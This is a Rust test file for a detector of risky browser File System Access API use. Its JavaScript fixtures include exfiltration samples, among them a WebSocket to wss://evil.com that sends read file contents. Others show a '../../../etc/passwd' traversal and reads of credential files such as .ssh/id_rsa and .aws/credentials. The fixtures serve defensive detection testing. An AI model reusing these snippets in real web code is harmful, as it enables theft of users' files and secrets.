use crate::file_system_access_audit::*;

#[test]
fn no_file_api_no_issues() {
    assert!(analyze_file_system_access("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_open_file_picker() {
    let body = r#"<script>const fh = await showOpenFilePicker();</script>"#;
    let issues = analyze_file_system_access(body);
    assert!(issues.contains(&FileSystemAccessIssue::ApiDetected));
}

#[test]
fn detects_save_file_picker() {
    let body = r#"<script>const fh = await showSaveFilePicker();</script>"#;
    let issues = analyze_file_system_access(body);
    assert!(issues.contains(&FileSystemAccessIssue::ApiDetected));
    assert!(issues.contains(&FileSystemAccessIssue::SilentWrite));
}

#[test]
fn detects_file_exfiltration() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        fetch("/upload", {method: "POST", body: await file.text()});
    </script>"#;
    let issues = analyze_file_system_access(body);
    assert!(issues.contains(&FileSystemAccessIssue::FileExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        console.log(fh);
    </script>"#;
    let issues = analyze_file_system_access(body);
    assert!(!issues.contains(&FileSystemAccessIssue::FileExfiltration));
}

#[test]
fn detects_silent_write() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const fh = await showSaveFilePicker();
            const writable = await fh.createWritable();
        });
    </script>"#;
    let issues = analyze_file_system_access(body);
    assert!(issues.contains(&FileSystemAccessIssue::SilentWrite));
}

#[test]
fn detects_directory_access() {
    let body = r#"<script>
        const dh = await showDirectoryPicker();
    </script>"#;
    let issues = analyze_file_system_access(body);
    assert!(issues.contains(&FileSystemAccessIssue::DirectoryAccess));
}

#[test]
fn detects_no_user_activation() {
    let body = r#"<script>const fh = await showOpenFilePicker();</script>"#;
    let issues = analyze_file_system_access(body);
    assert!(issues.contains(&FileSystemAccessIssue::NoUserActivation));
}

#[test]
fn no_activation_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const fh = await showOpenFilePicker();
        });
    </script>"#;
    let issues = analyze_file_system_access(body);
    assert!(!issues.contains(&FileSystemAccessIssue::NoUserActivation));
}

#[test]
fn detects_persistent_handle() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const fh = await showOpenFilePicker();
            const perm = await fh.queryPermission({mode: "readwrite"});
        });
    </script>"#;
    let issues = analyze_file_system_access(body);
    assert!(issues.contains(&FileSystemAccessIssue::PersistentHandle));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(
        file_system_access_severity(&FileSystemAccessIssue::FileExfiltration),
        7.5
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(
        file_system_access_severity(&FileSystemAccessIssue::ApiDetected),
        3.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        FileSystemAccessIssue::ApiDetected,
        FileSystemAccessIssue::DirectoryAccess,
    ];
    let mut seq = 0;
    let ops = file_system_access_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        FileSystemAccessIssue::ApiDetected.to_string(),
        "api_detected"
    );
    assert_eq!(
        FileSystemAccessIssue::FileExfiltration.to_string(),
        "file_exfiltration"
    );
    assert_eq!(
        FileSystemAccessIssue::SilentWrite.to_string(),
        "silent_write"
    );
    assert_eq!(
        FileSystemAccessIssue::DirectoryAccess.to_string(),
        "directory_access"
    );
    assert_eq!(
        FileSystemAccessIssue::NoUserActivation.to_string(),
        "no_user_activation"
    );
    assert_eq!(
        FileSystemAccessIssue::PersistentHandle.to_string(),
        "persistent_handle"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_file_system_access("").is_empty());
}

// FileSystemAccessSecurityIssue tests

#[test]
fn security_no_file_api_no_issues() {
    let body = "<html><body>hello</body></html>";
    assert!(analyze_file_system_access_security(body).is_empty());
}

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_file_system_access_security("").is_empty());
}

#[test]
fn detects_unrestricted_file_access() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::UnrestrictedFileAccess));
}

#[test]
fn no_unrestricted_when_accept_present() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker({
            types: [{accept: {'image/*': ['.png', '.jpg']}}]
        });
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::UnrestrictedFileAccess));
}

#[test]
fn no_unrestricted_when_accept_with_quotes() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker({
            "accept": {"text/plain": [".txt"]}
        });
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::UnrestrictedFileAccess));
}

#[test]
fn no_unrestricted_when_types_present() {
    let body = r#"<script>
        const opts = { types: [{ description: 'Text' }] };
        const [fh] = await showOpenFilePicker(opts);
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::UnrestrictedFileAccess));
}

#[test]
fn detects_directory_traversal_with_parent() {
    let body = r#"<script>
        const dh = await showDirectoryPicker();
        const parent = await dh.getParent();
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::DirectoryTraversal));
}

#[test]
fn detects_directory_traversal_with_dotdot() {
    let body = r#"<script>
        const dh = await showDirectoryPicker();
        const file = await dh.getFileHandle('../../../etc/passwd');
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::DirectoryTraversal));
}

#[test]
fn detects_directory_traversal_with_resolve() {
    let body = r#"<script>
        const dh = await showDirectoryPicker();
        const path = await dh.resolve(otherHandle);
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::DirectoryTraversal));
}

#[test]
fn no_traversal_without_directory_picker() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const parent = getParent(fh);
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::DirectoryTraversal));
}

#[test]
fn detects_sensitive_file_env() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        if (fh.name === '.env') { /* ... */ }
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::SensitiveFileTypeAccess));
}

#[test]
fn detects_sensitive_file_ssh() {
    let body = r#"<script>
        const opts = { suggestedName: '.ssh/id_rsa' };
        const fh = await showSaveFilePicker(opts);
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::SensitiveFileTypeAccess));
}

#[test]
fn detects_sensitive_file_key() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const filter = name => name.endsWith('.key') || name.endsWith('.pem');
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::SensitiveFileTypeAccess));
}

#[test]
fn detects_sensitive_file_p12() {
    let body = r#"<script>
        showOpenFilePicker();
        const cert = 'file.p12';
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::SensitiveFileTypeAccess));
}

#[test]
fn detects_sensitive_file_aws() {
    let body = r#"<script>
        const path = '.aws/credentials';
        showOpenFilePicker();
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::SensitiveFileTypeAccess));
}

#[test]
fn detects_file_exfiltration_fetch() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        const content = await file.text();
        fetch('/upload', { method: 'POST', body: content });
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::FileExfiltrationPattern));
}

#[test]
fn detects_file_exfiltration_xhr() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        const buf = await file.arrayBuffer();
        const xhr = new XMLHttpRequest();
        xhr.send(buf);
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::FileExfiltrationPattern));
}

#[test]
fn detects_file_exfiltration_websocket() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        const text = await file.text();
        const ws = new WebSocket('wss://evil.com');
        ws.send(text);
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::FileExfiltrationPattern));
}

#[test]
fn detects_file_exfiltration_postmessage() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        const content = await file.text();
        window.parent.postMessage(content, '*');
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::FileExfiltrationPattern));
}

#[test]
fn no_exfiltration_without_network() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        const content = await file.text();
        console.log(content);
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::FileExfiltrationPattern));
}

#[test]
fn detects_large_file_read_mb() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        if (file.size > 100 * 1024 * 1024) {
            const data = await file.text();
        }
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::LargeFileRead));
}

#[test]
fn detects_large_file_read_gb() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        const maxSize = 5 * 1024 * 1024 * 1024; // 5 GB
        if (file.size < maxSize) await file.text();
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::LargeFileRead));
}

#[test]
fn no_large_file_read_with_chunking() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const file = await fh.getFile();
        if (file.size > 1024 * 1024) {
            const chunk = file.slice(0, 1024);
        }
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::LargeFileRead));
}

#[test]
fn no_large_file_read_with_stream() {
    let body = r#"<script>
        const file = await fh.getFile();
        const stream = file.stream();
        const reader = stream.getReader();
        while (true) {
            const {done, value} = await reader.read();
            if (done) break;
        }
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::LargeFileRead));
}

#[test]
fn detects_silent_file_write_createwritable() {
    let body = r#"<script>
        const fh = await showSaveFilePicker();
        const writable = await fh.createWritable();
        await writable.write('data');
        await writable.close();
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::SilentFileWrite));
}

#[test]
fn detects_silent_file_write_save_picker() {
    let body = r#"<script>
        const fh = await showSaveFilePicker();
        const writable = await fh.createWritable();
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::SilentFileWrite));
}

#[test]
fn no_silent_write_with_confirm() {
    let body = r#"<script>
        if (confirm('Save file?')) {
            const fh = await showSaveFilePicker();
            const writable = await fh.createWritable();
        }
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::SilentFileWrite));
}

#[test]
fn no_silent_write_with_alert() {
    let body = r#"<script>
        alert('About to save file');
        const fh = await showSaveFilePicker();
        const writable = await fh.createWritable();
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::SilentFileWrite));
}

#[test]
fn detects_file_handle_leak_postmessage() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        window.parent.postMessage({ handle: fh }, '*');
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::FileHandleLeakCrossOrigin));
}

#[test]
fn detects_file_handle_leak_directory() {
    let body = r#"<script>
        const dh = await showDirectoryPicker();
        iframe.contentWindow.postMessage(dh, '*');
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::FileHandleLeakCrossOrigin));
}

#[test]
fn no_leak_with_origin_check() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        if (event.origin === 'https://trusted.com') {
            window.parent.postMessage(fh, event.origin);
        }
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::FileHandleLeakCrossOrigin));
}

#[test]
fn detects_persistent_file_access_indexeddb() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const db = await indexedDB.open('mydb');
        const tx = db.transaction('handles', 'readwrite');
        const fileHandle = fh;
        tx.objectStore('handles').put(fileHandle, 'filehandle');
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::PersistentFileAccess));
}

#[test]
fn detects_persistent_file_access_localstorage() {
    let body = r#"<script>
        const dh = await showDirectoryPicker();
        const dirHandle = dh;
        localStorage.setItem('dirhandle', JSON.stringify(dirHandle));
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::PersistentFileAccess));
}

#[test]
fn detects_persistent_file_access_sessionstorage() {
    let body = r#"<script>
        const [fh] = await showOpenFilePicker();
        const handle = fh;
        sessionStorage.fileHandle = handle;
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::PersistentFileAccess));
}

#[test]
fn detects_file_system_in_service_worker() {
    let body = r#"<script>
        navigator.serviceWorker.register('/sw.js');
        self.addEventListener('message', async (event) => {
            const [fh] = await showOpenFilePicker();
        });
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::FileSystemInServiceWorker));
}

#[test]
fn detects_file_system_in_sw_with_registration() {
    let body = r#"<script>
        self.registration.active.postMessage('ping');
        const dh = await showDirectoryPicker();
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::FileSystemInServiceWorker));
}

#[test]
fn detects_writable_stream_abuse_fetch() {
    let body = r#"<script>
        const fh = await showSaveFilePicker();
        const writable = await fh.createWritable();
        const writer = writable.getWriter();
        const data = await fetch('/secret');
        await writer.write(await data.text());
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::WritableStreamAbuse));
}

#[test]
fn detects_writable_stream_abuse_websocket() {
    let body = r#"<script>
        const fh = await showSaveFilePicker();
        const writable = await fh.createWritable();
        const writer = writable.getWriter();
        const ws = new WebSocket('wss://evil.com');
        ws.onmessage = (e) => writer.write(e.data);
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::WritableStreamAbuse));
}

#[test]
fn detects_writable_stream_abuse_postmessage() {
    let body = r#"<script>
        const fh = await showSaveFilePicker();
        const writable = await fh.createWritable();
        const writer = writable.getWriter();
        window.addEventListener('message', (e) => {
            writer.write(e.data);
        });
        parent.postMessage('ready', '*');
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(issues.contains(&FileSystemAccessSecurityIssue::WritableStreamAbuse));
}

#[test]
fn no_writable_abuse_without_external() {
    let body = r#"<script>
        const fh = await showSaveFilePicker();
        const writable = await fh.createWritable();
        const writer = writable.getWriter();
        await writer.write('local data');
    </script>"#;
    let issues = analyze_file_system_access_security(body);
    assert!(!issues.contains(&FileSystemAccessSecurityIssue::WritableStreamAbuse));
}

#[test]
fn security_severity_exfiltration_highest() {
    assert_eq!(
        file_system_access_security_severity(
            &FileSystemAccessSecurityIssue::FileExfiltrationPattern
        ),
        9.0
    );
}

#[test]
fn security_severity_sensitive_file_high() {
    assert_eq!(
        file_system_access_security_severity(
            &FileSystemAccessSecurityIssue::SensitiveFileTypeAccess
        ),
        8.5
    );
}

#[test]
fn security_severity_service_worker_lowest() {
    assert_eq!(
        file_system_access_security_severity(
            &FileSystemAccessSecurityIssue::FileSystemInServiceWorker
        ),
        4.5
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        FileSystemAccessSecurityIssue::UnrestrictedFileAccess,
        FileSystemAccessSecurityIssue::DirectoryTraversal,
        FileSystemAccessSecurityIssue::SensitiveFileTypeAccess,
    ];
    let mut seq = 0;
    let ops = file_system_access_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 3);
}

#[test]
fn security_display_unrestricted() {
    assert_eq!(
        FileSystemAccessSecurityIssue::UnrestrictedFileAccess.to_string(),
        "unrestricted_file_access"
    );
}

#[test]
fn security_display_directory_traversal() {
    assert_eq!(
        FileSystemAccessSecurityIssue::DirectoryTraversal.to_string(),
        "directory_traversal"
    );
}

#[test]
fn security_display_sensitive_file() {
    assert_eq!(
        FileSystemAccessSecurityIssue::SensitiveFileTypeAccess.to_string(),
        "sensitive_file_type_access"
    );
}

#[test]
fn security_display_exfiltration() {
    assert_eq!(
        FileSystemAccessSecurityIssue::FileExfiltrationPattern.to_string(),
        "file_exfiltration_pattern"
    );
}

#[test]
fn security_display_large_file() {
    assert_eq!(
        FileSystemAccessSecurityIssue::LargeFileRead.to_string(),
        "large_file_read"
    );
}

#[test]
fn security_display_silent_write() {
    assert_eq!(
        FileSystemAccessSecurityIssue::SilentFileWrite.to_string(),
        "silent_file_write"
    );
}

#[test]
fn security_display_cross_origin() {
    assert_eq!(
        FileSystemAccessSecurityIssue::FileHandleLeakCrossOrigin.to_string(),
        "file_handle_leak_cross_origin"
    );
}

#[test]
fn security_display_persistent() {
    assert_eq!(
        FileSystemAccessSecurityIssue::PersistentFileAccess.to_string(),
        "persistent_file_access"
    );
}

#[test]
fn security_display_service_worker() {
    assert_eq!(
        FileSystemAccessSecurityIssue::FileSystemInServiceWorker.to_string(),
        "file_system_in_service_worker"
    );
}

#[test]
fn security_display_writable_stream() {
    assert_eq!(
        FileSystemAccessSecurityIssue::WritableStreamAbuse.to_string(),
        "writable_stream_abuse"
    );
}
